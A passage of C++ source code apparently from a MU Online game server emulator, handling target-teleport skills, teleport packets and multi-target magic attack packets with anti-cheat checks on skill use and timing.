		pAttack.SourceNumberL = SET_NUMBERL(aIndex);
		int iTargetIndex = MAKE_NUMBERW(lpMsg->NumberL, lpMsg->NumberH);	// #error? parameters inverse?
		pAttack.TargetNumberH = SET_NUMBERH(iTargetIndex);	// #error? parameters inverse?
		pAttack.TargetNumberL = SET_NUMBERL(iTargetIndex);	// #error? parameters inverse?
		lpMagic = gObjGetMagicSearch(&gObj[aIndex], AT_SKILL_TARGET_TELEPORT);
		x = lpMsg->MapX;
		y = lpMsg->MapY;

		if ( !gObjIsConnectedGP(iTargetIndex) )
		{
			LogAddC(2, "[%s][%s] Try Target Teleport Not Move Area [%d,%d]",
				gObj[aIndex].AccountID, gObj[aIndex].Name, x, y);

			return;
		}

		if ( gObj[aIndex].PartyNumber != gObj[iTargetIndex].PartyNumber ||
			 gObj[aIndex].PartyNumber == -1 ||
			 gObj[iTargetIndex].PartyNumber == -1)
		{
			return;
		}

		if ( !gObjCheckTeleportArea(iTargetIndex, x, y))
		{
			LogAddC(2, "[%s][%s] Try Target Teleport Not Move Area [%d,%d]",
				gObj[aIndex].AccountID, gObj[aIndex].Name, x, y);

			return;
		}

		if ( lpMagic )
		{
			//int usemana = gObjMagicManaUse(&gObj[aIndex], lpMagic);
			int usemana = gObjUseSkill.GetUseMana(aIndex,lpMagic);

			if ( usemana >= 0 )
			{
				//int usebp = gObjMagicBPUse(&gObj[aIndex], lpMagic);
				int usebp = gObjUseSkill.GetUseBP(aIndex,lpMagic);

				if ( usebp >= 0 )
				{
					if ( gObj[aIndex].Type == OBJ_USER )
						DataSend(aIndex, (LPBYTE)&pAttack, pAttack.h.size);

					MsgSendV2(&gObj[aIndex], (LPBYTE)&pAttack, pAttack.h.size);
					gObjTeleportMagicUse(iTargetIndex, x, y);
					gObj[aIndex].Mana -= usemana;
					gObj[aIndex].BP -= usebp;
					GCManaSend(gObj[aIndex].m_Index, gObj[aIndex].Mana, -1, 0, gObj[aIndex].BP);

					return;
				}
			}
		}
	}
}






void GCTeleportSend(LPOBJ lpObj, WORD MoveNumber, BYTE MapNumber, BYTE MapX, BYTE MapY, BYTE Dir)
{
	PMSG_TELEPORT_RESULT pMsg;

	if ( lpObj->Type != OBJ_USER )
		return;

	pMsg.h.c = 0xC3;
	pMsg.h.size = sizeof(pMsg);
	pMsg.h.headcode = 0x1C;
	pMsg.MoveNumber = MoveNumber;
	pMsg.MapNumber = MapNumber;
	pMsg.MapX = MapX;
	pMsg.MapY = MapY;
	pMsg.Dir = Dir;
	pMsg.UNK0 = 0;
	pMsg.UNK1 = 0;

	if ( MoveNumber == 0 )
		DataSend(lpObj->m_Index, (UCHAR*)&pMsg, pMsg.h.size);
	else
		DataSend(lpObj->m_Index, (UCHAR*)&pMsg, pMsg.h.size);
}





void CGBeattackRecv(unsigned char* lpRecv, int aIndex, int magic_send)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	// Set the lpRecv to a Predeterminated Packet
	bool IsS5E2 = false;
	if(ReadConfig.IsEngProtocol == 0)
	{
		IsS5E2 = true;
	}else
	{
		if(lpRecv[1] == 12)
			IsS5E2 = true;
	}
	if(ReadConfig.S5E2 == TRUE && IsS5E2 == true)
	{
		PMSG_BEATTACK_COUNT_S5E2 * lpCount = (PMSG_BEATTACK_COUNT_S5E2 *)lpRecv;

		// Check the Protocol
		if ( lpCount->h.headcode != 0x10 )
		{
			LogAdd("error-L3 %s %d", __FILE__, __LINE__);
			return;
		}

		// Check if the count is leess than 1
		if ( lpCount->Count < 1 )
		{
			LogAdd("error-L3 %s %d", __FILE__, __LINE__);
			return;
		}

		// Set the Max limitation to 5
		if ( lpCount->Count > 5 )
		{
			lpCount->Count = 5;
		}

		// Set the Start of the Offset
		int lOfs = sizeof(PMSG_BEATTACK_COUNT_S5E2);
		CMagicInf * lpMagic;
		int tNumber;
		PMSG_BEATTACK_S5E2 * lpMsg;

		// Set lpMagic according
		// if aIndex is OBJ_USER
		// or if it is OBJ_MONSTER
		int Magic;

		if(gObj[aIndex].UseMagicNumber != 235)
			Magic = MAKE_NUMBERW(lpCount->MagicNumberH,lpCount->MagicNumberL);
		else 
		{
			//if (gObj[aIndex].Class = 2)	//DaRKav Fix
			if (gObj[aIndex].Class == CLASS_ELF )
				Magic = 235;
			else
				Magic = MAKE_NUMBERW(lpCount->MagicNumberH,lpCount->MagicNumberL);
		}

		if ( gObj[aIndex].Type == OBJ_USER )
		{
			//lpMagic = gObjGetMagicSearch(&gObj[aIndex], lpCount->MagicNumber);
			if(ReadConfig.S6E2 == 1)
			{
				if(gObj[aIndex].UseMagicNumber != 0)
				{
					CMagicInf * lpMagic2;
					lpMagic2 = gObjGetMagicSearch(&gObj[aIndex], gObj[aIndex].UseMagicNumber);
					if ( lpMagic2 != NULL )
						if(lpMagic2->m_MasterSkill > 0)
							Magic = gObj[aIndex].UseMagicNumber;
				}
			}
			lpMagic = gObjGetMagicSearch(&gObj[aIndex], Magic);
		}
		else
		{
			//lpMagic = gObjGetMagic(&gObj[aIndex], lpCount->MagicNumber);
			lpMagic = gObjGetMagic(&gObj[aIndex], Magic);
		}

		// Check if there is Magic
		if ( lpMagic == NULL )
		{
			LogAdd("error-L3 %s %d Magic ID: %d", __FILE__, __LINE__, Magic);
			return;
		}

		// Avoid use Skill of the following types
		if ( lpMagic->m_Skill == 42 ||
			 lpMagic->m_Skill == 43 ||
			 lpMagic->m_Skill == 41 || 
			 (lpMagic->m_Skill>= 455 && lpMagic->m_Skill<=459) ||//TWISTING NEW
			 (lpMagic->m_Skill>= 495 && lpMagic->m_Skill<=499) ||//TWISTING NEW
			 (lpMagic->m_Skill>= 460 && lpMagic->m_Skill<=464) ||//Death Stab NEW)	
			 (lpMagic->m_Skill>= 465 && lpMagic->m_Skill<=469))//Rageful Blow NEW)	
		{
			return;
		}

		if ( gObj[aIndex].Type == OBJ_USER )
		{
			// Check if Player can use Magic
			// Acording to its Class
			if ( MagicDamageC.SkillGetRequireClass(gObj[aIndex].Class,
													gObj[aIndex].ChangeUP,
													lpMagic->m_Skill) < 1 )
			{
				// It's not his magic [%s][%s] .
				LogAddC(2, lMsg.Get(MSGGET(1, 239)),
					gObj[aIndex].AccountID,
					gObj[aIndex].Name,
					lpMagic->m_Skill);	// #error Deathway change on WTFFile

				gObjUserKill(aIndex);
				return;
			}

			// Check the time cast Spell
			// No longer that 8 seconds
			if ( (GetTickCount()- gObj[aIndex].UseMagicTime) > 8000 )
			{
				LogAddC(2, "Too long time passed after casting magic. [%s][%s] (%d)(%d)",
					gObj[aIndex].AccountID,
					gObj[aIndex].Name,
					lpMagic->m_Skill,
					GetTickCount() - gObj[aIndex].UseMagicTime);

				return;
			}

			// Check if user cast to much Spells
			// Npo longer thant 4
			if ( gObj[aIndex].UseMagicCount > 4 )
			{
				return;
			}

			gObj[aIndex].UseMagicCount++;
		}


		// Avoid Attack out of the predeterminated
		// Magic need to be one of the following
		//	
		//	5	"Flame"
		//	8	"Twister"
		//	9	"Evil Spirit"
		//	10	"Hellfire"
		//	12	"Aquaflash"
		//	13	"Blast"
		//	14	"Inferno"
		//	24	"Triple Shot"
		//	41	"Twisting Slash"
		//	42	"Rageful Blow"
		//	43	"Death Stab"
		//	47	"Impale"
		//	50	"Flame of Evil(Monster)"
		//	52	"Penetration"
		//	55	"Fire Slash"
		//	78	"#Unknown"

		if (	 lpMagic->m_Skill != 8
			  && lpMagic->m_Skill != 150
			  && lpMagic->m_Skill != 445
			  && lpMagic->m_Skill != 446
			  && lpMagic->m_Skill != 447
			  && lpMagic->m_Skill != 448
			  && lpMagic->m_Skill != 449
			  && lpMagic->m_Skill != 530
			  && lpMagic->m_Skill != 531
			  && lpMagic->m_Skill != 532
			  && lpMagic->m_Skill != 533
			  && lpMagic->m_Skill != 534
			  && lpMagic->m_Skill != 9
			  && lpMagic->m_Skill != 440
			  && lpMagic->m_Skill != 441
			  && lpMagic->m_Skill != 442
			  && lpMagic->m_Skill != 443
			  && lpMagic->m_Skill != 444
			  && lpMagic->m_Skill != 10
			  && lpMagic->m_Skill != 510
			  && lpMagic->m_Skill != 511
			  && lpMagic->m_Skill != 512
			  && lpMagic->m_Skill != 513
			  && lpMagic->m_Skill != 514
			  && lpMagic->m_Skill != 13
			  && lpMagic->m_Skill != 14
			  && lpMagic->m_Skill != 5
			  && lpMagic->m_Skill != 24
			  && lpMagic->m_Skill != 490
			  && lpMagic->m_Skill != 491
			  && lpMagic->m_Skill != 492
			  && lpMagic->m_Skill != 493
			  && lpMagic->m_Skill != 494
			  && lpMagic->m_Skill != 235
			  && lpMagic->m_Skill != 50
			  && lpMagic->m_Skill != 12
			  && lpMagic->m_Skill != 41
			  && lpMagic->m_Skill != 47
			  && lpMagic->m_Skill != 43
			  && lpMagic->m_Skill != 42
			  && lpMagic->m_Skill != 52
			  && lpMagic->m_Skill != 500
			  && lpMagic->m_Skill != 501
			  && lpMagic->m_Skill != 502
			  && lpMagic->m_Skill != 503
			  && lpMagic->m_Skill != 504
			  && lpMagic->m_Skill != 55
			  && lpMagic->m_Skill != 525
			  && lpMagic->m_Skill != 526
			  && lpMagic->m_Skill != 527
			  && lpMagic->m_Skill != 528
			  && lpMagic->m_Skill != 529
			  && lpMagic->m_Skill != 78		  
			  && lpMagic->m_Skill != 455
			  && lpMagic->m_Skill != 456
			  && lpMagic->m_Skill != 457
			  && lpMagic->m_Skill != 458
			  && lpMagic->m_Skill != 459
			  && lpMagic->m_Skill != 495
			  && lpMagic->m_Skill != 496
			  && lpMagic->m_Skill != 497
			  && lpMagic->m_Skill != 498
			  && lpMagic->m_Skill != 499
			  && lpMagic->m_Skill != 460
			  && lpMagic->m_Skill != 461
			  && lpMagic->m_Skill != 462
			  && lpMagic->m_Skill != 463
			  && lpMagic->m_Skill != 464
			  && lpMagic->m_Skill != 465
			  && lpMagic->m_Skill != 466
			  && lpMagic->m_Skill != 467
			  && lpMagic->m_Skill != 468
			  && lpMagic->m_Skill != 469
			  //&& lpMagic->m_Skill != 150
			  )
		{
			LogAdd("error-L3 Skill: %d / File: %s / Line: %d", lpMagic->m_Skill, __FILE__, __LINE__);
			return;
		}

		if ( lpMagic->m_Skill == 24 || lpMagic->m_Skill == 235 || lpMagic->m_Skill == 78 || (lpMagic->m_Skill >= 525 && lpMagic->m_Skill <= 529) || lpMagic->m_Skill == 490 || lpMagic->m_Skill == 491 || lpMagic->m_Skill == 492 || lpMagic->m_Skill == 493 || lpMagic->m_Skill == 494 )
		{
			int NSAttackSerial = lpCount->Serial;

			if ( gObj[aIndex].OSAttackSerial >= 255 && (gObj[aIndex].OSAttackSerial - lpCount->Serial) > 50 )
			{
				gObj[aIndex].OSAttackSerial = -1;
			}
		
			if ( NSAttackSerial > gObj[aIndex].OSAttackSerial )
			{
				gObj[aIndex].OSAttackSerial = NSAttackSerial;
				if ( !gObjUseSkill.SpeedHackCheck(aIndex,2) )
				{
					return;
				}
			}
		}
		
		int lOfs2 = lOfs;
		int pTargetNumber[128];
		
		for (int i=0;i<lpCount->Count;i++)
		{
			lpMsg = (PMSG_BEATTACK_S5E2 *)&lpRecv[lOfs2];
			pTargetNumber[i] = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);
			lOfs2 += sizeof(PMSG_BEATTACK);
		}

		for (int n=0;n<lpCount->Count;n++)
		{
			lpMsg = (PMSG_BEATTACK_S5E2 *)&lpRecv[lOfs];
			tNumber = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);
			LPOBJ lpObj = &gObj[aIndex];

			if ( lpMsg->MagicKey  && (lpMagic->m_Skill == 9 || ((lpMagic->m_Skill >= 445 && lpMagic->m_Skill <= 449) || (lpMagic->m_Skill >= 530 && lpMagic->m_Skill <= 534))))	// "Evil Spirit"
			{
				if ( lpObj->DurMagicKeyChecker.IsValidDurationTime(lpMsg->MagicKey) == FALSE )
				{
					//ANTI_HACK_LOG.Output("[CGBeattackRecv] InValid DurationTime Key = %d ( Time : %d) sk: %d, ser: %d [%s][%s]",	// #error BIG_ERROR Deathway Change tp %s %s ->FIXED
					//	lpMsg->MagicKey, lpObj->DurMagicKeyChecker.GetValidDurationTime(lpMsg->MagicKey),
					//	lpMagic->m_Skill, lpCount->Serial,
					//	lpObj->AccountID, lpObj->Name); 
					lOfs += sizeof(PMSG_BEATTACK);

					continue;
				}
				
				if ( lpObj->DurMagicKeyChecker.IsValidCount(lpMsg->MagicKey) == FALSE )
				{
					//ANTI_HACK_LOG.Output("[CGBeattackRecv] InValid VailidCount = %d ( Count : %d) sk: %d, ser: %d [%s][%s]",	// #error BIG_ERROR Deathway Change tp %s %s -> FIXED
					//	lpMsg->MagicKey, lpObj->DurMagicKeyChecker.GetValidCount(lpMsg->MagicKey),
					//	lpMagic->m_Skill, lpCount->Serial,
					//	lpObj->AccountID, lpObj->Name); 
					lOfs += sizeof(PMSG_BEATTACK);

					continue;
				}
			}
			
			if ( gWriteSkillLog )
			{
				LogAddTD("[Magic Attack3][%s][%s] : %d, serial = %d, Tgt =  %d, cnt = %d",
					lpObj->AccountID, lpObj->Name,
					lpMagic->m_Skill, lpCount->Serial, tNumber, lpCount->Count);
			}

			if ( gEnableCheckPenetrationSkill )
			{
				if (( lpMagic->m_Skill == 78 ) || (lpMagic->m_Skill >= 525 && lpMagic->m_Skill <= 529))	// #error Also Put the Check for FireScream
				{
					if ( gMultiAttackHackCheck[gObj[aIndex].m_Index].CheckFireScreamSkill(tNumber, lpMagic->m_Skill, lpCount->Serial) == FALSE )
					{
						return;
					}
				}
				else if ( gMultiAttackHackCheck[gObj[aIndex].m_Index].CheckPenetrationSkill(tNumber, lpMagic->m_Skill, lpCount->Serial)== FALSE )
				{
					return;
				}
			}

	/*		for (i=0;i<lpCount->Count;i++)
			{
				if ( n != i)
				{
					if ( pTargetNumber[i] == tNumber )
					{
						GCServerMsgStringSend("[Anti-Hack] Multi Attack",aIndex, 0x01);
						if(ReadConfig.AHLog == TRUE)
						{
							ANTI_HACK_LOG.Output("[Anti-Hack][%s][%s] %s Hack : Multi Attack",
								gObj[aIndex].AccountID, gObj[aIndex].Name,
								lMsg.Get(MSGGET(7, 108)+gObj[aIndex].Class));
						}

						CloseClient(gObj[aIndex].m_Index);
						return;
					}
				}
			}*/

			if ( tNumber >= 0 && tNumber < OBJMAX-1 )
			{
				if (( lpMagic->m_Skill == 55 ) || (lpMagic->m_Skill >= 500 && lpMagic->m_Skill <= 504))
				{
					gObjUseSkill.MaGumSkillDefenseDown(aIndex, tNumber, lpMagic->m_Level,lpMagic->m_Skill);
					gObjAttack(&gObj[aIndex], &gObj[tNumber], lpMagic, TRUE, 1, 0, FALSE);
				}
				else if (( lpMagic->m_Skill == 78 ) || (lpMagic->m_Skill >= 525 && lpMagic->m_Skill <= 529))
				{
					gObjUseSkill.SkillFireScream(aIndex, tNumber, lpMagic);
				}
				else if ( magic_send )
				{
					gObjAttack(&gObj[aIndex], &gObj[tNumber], lpMagic, TRUE, 1, 0, FALSE);
				}
				else
				{
					gObjAttack(&gObj[aIndex], &gObj[tNumber], lpMagic, FALSE, 1, 0, FALSE);
				}
			}

			lOfs += sizeof(PMSG_BEATTACK);
		}
	}else
	{
		PMSG_BEATTACK_COUNT * lpCount = (PMSG_BEATTACK_COUNT *)lpRecv;

		// Check the Protocol
		if ( lpCount->h.headcode != 0x10 )
		{
			LogAdd("error-L3 %s %d", __FILE__, __LINE__);
			return;
		}

		// Check if the count is leess than 1
		if ( lpCount->Count < 1 )
		{
			LogAdd("error-L3 %s %d", __FILE__, __LINE__);
			//return;	TEST FOR MAGIC!!!
		}

		// Set the Max limitation to 5
		if ( lpCount->Count > 5 )
		{
			lpCount->Count = 5;
		}

		// Set the Start of the Offset
		int lOfs = sizeof(PMSG_BEATTACK_COUNT);
		CMagicInf * lpMagic;
		int tNumber;
		PMSG_BEATTACK * lpMsg;

		// Set lpMagic according
		// if aIndex is OBJ_USER
		// or if it is OBJ_MONSTER
		int Magic;

		if(gObj[aIndex].UseMagicNumber != 235)
			Magic = MAKE_NUMBERW(lpCount->MagicNumberH,lpCount->MagicNumberL);
		else 
		{
			//if (gObj[aIndex].Class = 2)	//DaRKav Fix
			if (gObj[aIndex].Class == CLASS_ELF)
				Magic = 235;
			else
				Magic = MAKE_NUMBERW(lpCount->MagicNumberH,lpCount->MagicNumberL);
		}

		if ( gObj[aIndex].Type == OBJ_USER )
		{
			//lpMagic = gObjGetMagicSearch(&gObj[aIndex], lpCount->MagicNumber);
			if(ReadConfig.S6E2 == 1)
			{
				if(gObj[aIndex].UseMagicNumber != 0)
				{
					CMagicInf * lpMagic2;
					lpMagic2 = gObjGetMagicSearch(&gObj[aIndex], gObj[aIndex].UseMagicNumber);
					if ( lpMagic2 != NULL )
						if(lpMagic2->m_MasterSkill > 0)
							Magic = gObj[aIndex].UseMagicNumber;
				}
			}
			lpMagic = gObjGetMagicSearch(&gObj[aIndex], Magic);
		}
		else
		{
			//lpMagic = gObjGetMagic(&gObj[aIndex], lpCount->MagicNumber);
			lpMagic = gObjGetMagic(&gObj[aIndex], Magic);
		}

		// Check if there is Magic
		if ( lpMagic == NULL )
		{
			LogAdd("error-L3 %s %d Magic ID: %d", __FILE__, __LINE__, Magic);
			return;
		}

		// Avoid use Skill of the following types
		if ( lpMagic->m_Skill == 42 ||
			 lpMagic->m_Skill == 43 ||
			 lpMagic->m_Skill == 41 || 
			 (lpMagic->m_Skill>= 455 && lpMagic->m_Skill<=459) ||//TWISTING NEW
			 (lpMagic->m_Skill>= 495 && lpMagic->m_Skill<=499) ||//TWISTING NEW
			 (lpMagic->m_Skill>= 460 && lpMagic->m_Skill<=464) ||//Death Stab NEW)	
			 (lpMagic->m_Skill>= 465 && lpMagic->m_Skill<=469))//Rageful Blow NEW)	
		{
			return;
		}

		if ( gObj[aIndex].Type == OBJ_USER )
		{
			// Check if Player can use Magic
			// Acording to its Class
			if ( MagicDamageC.SkillGetRequireClass(gObj[aIndex].Class,
													gObj[aIndex].ChangeUP,
													lpMagic->m_Skill) < 1 )
			{
				// It's not his magic [%s][%s] .
				LogAddC(2, lMsg.Get(MSGGET(1, 239)),
					gObj[aIndex].AccountID,
					gObj[aIndex].Name,
					lpMagic->m_Skill);	// #error Deathway change on WTFFile

				gObjUserKill(aIndex);
				return;
			}

			// Check the time cast Spell
			// No longer that 8 seconds
			if ( (GetTickCount()- gObj[aIndex].UseMagicTime) > 8000 )
			{
				LogAddC(2, "Too long time passed after casting magic. [%s][%s] (%d)(%d)",
					gObj[aIndex].AccountID,
					gObj[aIndex].Name,
					lpMagic->m_Skill,
					GetTickCount() - gObj[aIndex].UseMagicTime);

				return;
			}

			// Check if user cast to much Spells
			// Npo longer thant 4
			if ( gObj[aIndex].UseMagicCount > 4 )
			{
				return;
			}

			gObj[aIndex].UseMagicCount++;
		}


		// Avoid Attack out of the predeterminated
		// Magic need to be one of the following
		//	
		//	5	"Flame"
		//	8	"Twister"
		//	9	"Evil Spirit"
		//	10	"Hellfire"
		//	12	"Aquaflash"
		//	13	"Blast"
		//	14	"Inferno"
		//	24	"Triple Shot"
		//	41	"Twisting Slash"
		//	42	"Rageful Blow"
		//	43	"Death Stab"
		//	47	"Impale"
		//	50	"Flame of Evil(Monster)"
		//	52	"Penetration"
		//	55	"Fire Slash"
		//	78	"#Unknown"

		if (	 lpMagic->m_Skill != 8
			  && lpMagic->m_Skill != 445
			  && lpMagic->m_Skill != 446
			  && lpMagic->m_Skill != 447
			  && lpMagic->m_Skill != 448
			  && lpMagic->m_Skill != 449
			  && lpMagic->m_Skill != 530
			  && lpMagic->m_Skill != 531
			  && lpMagic->m_Skill != 532
			  && lpMagic->m_Skill != 533
			  && lpMagic->m_Skill != 534
			  && lpMagic->m_Skill != 9
			  && lpMagic->m_Skill != 440
			  && lpMagic->m_Skill != 441
			  && lpMagic->m_Skill != 442
			  && lpMagic->m_Skill != 443
			  && lpMagic->m_Skill != 444
			  && lpMagic->m_Skill != 10
			  && lpMagic->m_Skill != 510
			  && lpMagic->m_Skill != 511
			  && lpMagic->m_Skill != 512
			  && lpMagic->m_Skill != 513
			  && lpMagic->m_Skill != 514
			  && lpMagic->m_Skill != 13
			  && lpMagic->m_Skill != 14
			  && lpMagic->m_Skill != 5
			  && lpMagic->m_Skill != 24
			  && lpMagic->m_Skill != 490
			  && lpMagic->m_Skill != 491
			  && lpMagic->m_Skill != 492
			  && lpMagic->m_Skill != 493
			  && lpMagic->m_Skill != 494
			  && lpMagic->m_Skill != 235
			  && lpMagic->m_Skill != 50
			  && lpMagic->m_Skill != 12
			  && lpMagic->m_Skill != 41
			  && lpMagic->m_Skill != 47
			  && lpMagic->m_Skill != 43
			  && lpMagic->m_Skill != 42
			  && lpMagic->m_Skill != 52
			  && lpMagic->m_Skill != 500
			  && lpMagic->m_Skill != 501
			  && lpMagic->m_Skill != 502
			  && lpMagic->m_Skill != 503
			  && lpMagic->m_Skill != 504
			  && lpMagic->m_Skill != 55
			  && lpMagic->m_Skill != 525
			  && lpMagic->m_Skill != 526
			  && lpMagic->m_Skill != 527
			  && lpMagic->m_Skill != 528
			  && lpMagic->m_Skill != 529
			  && lpMagic->m_Skill != 78		  
			  && lpMagic->m_Skill != 455
			  && lpMagic->m_Skill != 456
			  && lpMagic->m_Skill != 457
			  && lpMagic->m_Skill != 458
			  && lpMagic->m_Skill != 459
			  && lpMagic->m_Skill != 495
			  && lpMagic->m_Skill != 496
			  && lpMagic->m_Skill != 497
			  && lpMagic->m_Skill != 498
			  && lpMagic->m_Skill != 499
			  && lpMagic->m_Skill != 460
			  && lpMagic->m_Skill != 461
			  && lpMagic->m_Skill != 462
			  && lpMagic->m_Skill != 463
			  && lpMagic->m_Skill != 464
			  && lpMagic->m_Skill != 465
			  && lpMagic->m_Skill != 466
			  && lpMagic->m_Skill != 467
			  && lpMagic->m_Skill != 468
			  && lpMagic->m_Skill != 469
			  )
		{
			LogAdd("error-L3 Skill: %d / File: %s / Line: %d", lpMagic->m_Skill, __FILE__, __LINE__);
			return;
		}

		if ( lpMagic->m_Skill == 24 || lpMagic->m_Skill == 235 || lpMagic->m_Skill == 78 || (lpMagic->m_Skill >= 525 && lpMagic->m_Skill <= 529) || lpMagic->m_Skill == 490 || lpMagic->m_Skill == 491 || lpMagic->m_Skill == 492 || lpMagic->m_Skill == 493 || lpMagic->m_Skill == 494 )
		{
			int NSAttackSerial = lpCount->Serial;

			if ( gObj[aIndex].OSAttackSerial >= 255 && (gObj[aIndex].OSAttackSerial - lpCount->Serial) > 50 )
			{
				gObj[aIndex].OSAttackSerial = -1;
			}
		
			if ( NSAttackSerial > gObj[aIndex].OSAttackSerial )
			{
				gObj[aIndex].OSAttackSerial = NSAttackSerial;
				if ( !gObjUseSkill.SpeedHackCheck(aIndex,2) )
				{
					return;
				}
			}
		}
		
		int lOfs2 = lOfs;
		int pTargetNumber[128];
		
		for (int i=0;i<lpCount->Count;i++)
		{
			lpMsg = (PMSG_BEATTACK *)&lpRecv[lOfs2];
			pTargetNumber[i] = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);
			lOfs2 += sizeof(PMSG_BEATTACK);
		}

		for (int n=0;n<lpCount->Count;n++)
		{
			lpMsg = (PMSG_BEATTACK *)&lpRecv[lOfs];
			tNumber = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);
			LPOBJ lpObj = &gObj[aIndex];

			if ( lpMsg->MagicKey  && (lpMagic->m_Skill == 9 || ((lpMagic->m_Skill >= 445 && lpMagic->m_Skill <= 449) || (lpMagic->m_Skill >= 530 && lpMagic->m_Skill <= 534))))	// "Evil Spirit"
			{
				if ( lpObj->DurMagicKeyChecker.IsValidDurationTime(lpMsg->MagicKey) == FALSE )
				{
					LogAddC(0, "[CGBeattackRecv] InValid DurationTime Key = %d ( Time : %d) [%s][%s]",	// #error BIG_ERROR Deathway Change tp %s %s ->FIXED
						lpMsg->MagicKey, lpObj->DurMagicKeyChecker.GetValidDurationTime(lpMsg->MagicKey),
						lpObj->AccountID, lpObj->Name); 
					lOfs += sizeof(PMSG_BEATTACK);

					continue;
				}
				
				if ( lpObj->DurMagicKeyChecker.IsValidCount(lpMsg->MagicKey) == FALSE )
				{
					LogAddC(0, "[CGBeattackRecv] InValid VailidCount = %d ( Count : %d) [%s][%s]",	// #error BIG_ERROR Deathway Change tp %s %s -> FIXED
						lpMsg->MagicKey, lpObj->DurMagicKeyChecker.GetValidCount(lpMsg->MagicKey),
						lpObj->AccountID, lpObj->Name); 
					lOfs += sizeof(PMSG_BEATTACK);

					continue;
				}
			}
			
			if ( gWriteSkillLog )
			{
				LogAddTD("[Magic Attack3][%s][%s] : %d, serial = %d, Tgt =  %d, cnt = %d",
					lpObj->AccountID, lpObj->Name,
					lpMagic->m_Skill, lpCount->Serial, tNumber, lpCount->Count);
			}

			if ( gEnableCheckPenetrationSkill )
			{
				if (( lpMagic->m_Skill == 78 ) || (lpMagic->m_Skill >= 525 && lpMagic->m_Skill <= 529))	// #error Also Put the Check for FireScream
				{
					if ( gMultiAttackHackCheck[gObj[aIndex].m_Index].CheckFireScreamSkill(tNumber, lpMagic->m_Skill, lpCount->Serial) == FALSE )
					{
						return;
					}
				}
				else if ( gMultiAttackHackCheck[gObj[aIndex].m_Index].CheckPenetrationSkill(tNumber, lpMagic->m_Skill, lpCount->Serial)== FALSE )
				{
					return;
				}
			}

	/*		for (i=0;i<lpCount->Count;i++)
			{
				if ( n != i)
				{
					if ( pTargetNumber[i] == tNumber )
					{
						GCServerMsgStringSend("[Anti-Hack] Multi Attack",aIndex, 0x01);
						if(ReadConfig.AHLog == TRUE)
						{
							ANTI_HACK_LOG.Output("[Anti-Hack][%s][%s] %s Hack : Multi Attack",
								gObj[aIndex].AccountID, gObj[aIndex].Name,
								lMsg.Get(MSGGET(7, 108)+gObj[aIndex].Class));
						}

						CloseClient(gObj[aIndex].m_Index);
						return;
					}
				}
			}*/

			if ( tNumber >= 0 && tNumber < OBJMAX-1 )
			{
				if (( lpMagic->m_Skill == 55 ) || (lpMagic->m_Skill >= 500 && lpMagic->m_Skill <= 504))
				{
					gObjUseSkill.MaGumSkillDefenseDown(aIndex, tNumber, lpMagic->m_Level,lpMagic->m_Skill);
					gObjAttack(&gObj[aIndex], &gObj[tNumber], lpMagic, TRUE, 1, 0, FALSE);
				}
				else if (( lpMagic->m_Skill == 78 ) || (lpMagic->m_Skill >= 525 && lpMagic->m_Skill <= 529))
				{
					gObjUseSkill.SkillFireScream(aIndex, tNumber, lpMagic);
				}
				else if ( magic_send )
				{
					gObjAttack(&gObj[aIndex], &gObj[tNumber], lpMagic, TRUE, 1, 0, FALSE);
				}
				else
				{
					gObjAttack(&gObj[aIndex], &gObj[tNumber], lpMagic, FALSE, 1, 0, FALSE);
				}
			}

			lOfs += sizeof(PMSG_BEATTACK);
		}
	}
}






void CGDurationMagicRecv(unsigned char * Msg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	/*
	MagicNumber = X
X = Y
Y = Dir
Dis = TargetPos
TargetPos = NumberH
NumnerH = NumberL
NumberL = MagicKey
MagicKey= UNK0
UNK0 = UNK1
UNK1 = UNK2
UNK2 = UNK3
UNK3 = UNK4*/ 

	//LPBYTE lpMsg;
	//bool IsS5E2 = false;
	//if(ReadConfig.IsEngProtocol == 0)
	//{
	//	IsS5E2 = true;
	//}else
	//{
	//	if(Msg[0] != 0xC1)
	//		IsS5E2 = true;
	//}
	////if(ReadConfig.S5E2 == TRUE && IsS5E2 == true)
	if(ReadConfig.S5E2 == TRUE && ReadConfig.IsEngProtocol == 0)
	//if(ReadConfig.S5E2 == TRUE)
	{
		PMSG_DURATION_MAGIC_RECV_S5E2* lpMsg = (PMSG_DURATION_MAGIC_RECV_S5E2 *) Msg;

		CMagicInf * lpMagic;
		LPOBJ lpObj = &gObj[aIndex];

		if(lpMsg->MagicNumberH == 0xCC)
			lpMsg->MagicNumberH = 0;
		int Magic = MAKE_NUMBERW(lpMsg->MagicNumberH,lpMsg->MagicNumberL);
		
		Mastering2.BaseSkill(Magic);

		if ( lpObj->Teleport )
		{
			return;
		}

		if ( gObj[aIndex].Type == OBJ_USER )
		{
			lpMagic = gObjGetMagicSearch(lpObj, Magic);
		}
		else
		{
			lpMagic = gObjGetMagic( lpObj, Magic);
		}

		if ( lpMagic == NULL )
		{
			return;
		}

		if ( lpObj->Type == OBJ_USER )
		{
			if ( MagicDamageC.CheckStatus(lpMagic->m_Skill, lpObj->GuildStatus) == FALSE )
			{
				LogAddC(2, "[0x1E] CGDurationMagicRecv() - Invalid Status");	// #warning maybe protocol here change
				return;
			}

			if ( MagicDamageC.CheckKillCount(lpMagic->m_Skill, lpObj->m_btKillCount) < 0 )
			{
				LogAddC(2, "[0x1E] CGDurationMagicRecv() - Invalid KillCount");
				return;
			}
		}

		if(lpMagic->m_Skill == 235)
			lpObj->UseMagicNumber = 235;
		else
			lpObj->UseMagicNumber = 0;

		if ((lpMagic->m_Skill != 24) && 
			(lpMagic->m_Skill != 235) && 
			(lpMagic->m_Skill != 490) && 
			(lpMagic->m_Skill != 491) && 
			(lpMagic->m_Skill != 492) && 
			(lpMagic->m_Skill != 493) && 
			(lpMagic->m_Skill != 494))
		{
			if ( !gObjUseSkill.SpeedHackCheck(aIndex,3) )
			{
				return;
			}
		}

		if ( !gObjUseSkill.EnableSkill(lpMagic->m_Skill) )
		{
			return;
		}

		int aTargetIndex = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);

		if(gObjIsConnected(aTargetIndex) == TRUE)
		{
			if ( gObj[aTargetIndex].Type == OBJ_USER )
			{
